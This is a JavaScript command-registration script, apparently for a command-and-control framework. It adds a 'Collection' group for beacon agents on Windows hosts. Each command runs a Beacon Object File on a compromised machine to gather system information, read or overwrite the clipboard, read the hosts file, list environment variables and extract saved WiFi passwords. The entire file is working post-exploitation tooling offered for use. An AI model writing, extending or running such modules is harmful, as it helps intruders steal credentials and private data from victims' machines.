var metadata = {
    name: "Collection-BOF",
    description: "Collection: system info, clipboard, hosts file, environment, WiFi"
};

var sysinfo = ax.create_command("sysinfo-bof", "Gather system information via BOF", "sysinfo-bof");
sysinfo.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [2]);
    let bof = ax.script_dir() + "_bin/sysinfo." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: System Info");
});

var clipboard_get = ax.create_command("clipboard-get", "Read clipboard content", "clipboard-get");
clipboard_get.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [0]);
    let bof = ax.script_dir() + "_bin/sysinfo." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Read Clipboard");
});

var clipboard_set = ax.create_command("clipboard-set", "Set clipboard content", "clipboard-set <text>");
clipboard_set.addArgString("text", false, "Text to set in clipboard");
clipboard_set.setPreHook(function(id, cmdline, parsed) {
    let text = parsed[0] || "";
    let params = ax.bof_pack("int,str", [1, text]);
    let bof = ax.script_dir() + "_bin/sysinfo." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Set Clipboard");
});

var hosts_read = ax.create_command("read-hosts", "Read hosts file", "read-hosts");
hosts_read.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [1]);
    let bof = ax.script_dir() + "_bin/browser." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Read Hosts File");
});

var env_list = ax.create_command("env-list", "List environment variables via BOF", "env-list");
env_list.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [3]);
    let bof = ax.script_dir() + "_bin/browser." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: List Environment Variables");
});

var wifi_pass = ax.create_command("wifi-passwords", "Show WiFi password extraction commands", "wifi-passwords");
wifi_pass.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [0]);
    let bof = ax.script_dir() + "_bin/browser." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: WiFi Passwords");
});

var group = ax.create_commands_group("Collection", [sysinfo, clipboard_get, clipboard_set, hosts_read, env_list, wifi_pass]);
ax.register_commands_group(group, ["beacon", "beacon9090"], ["windows"], []);
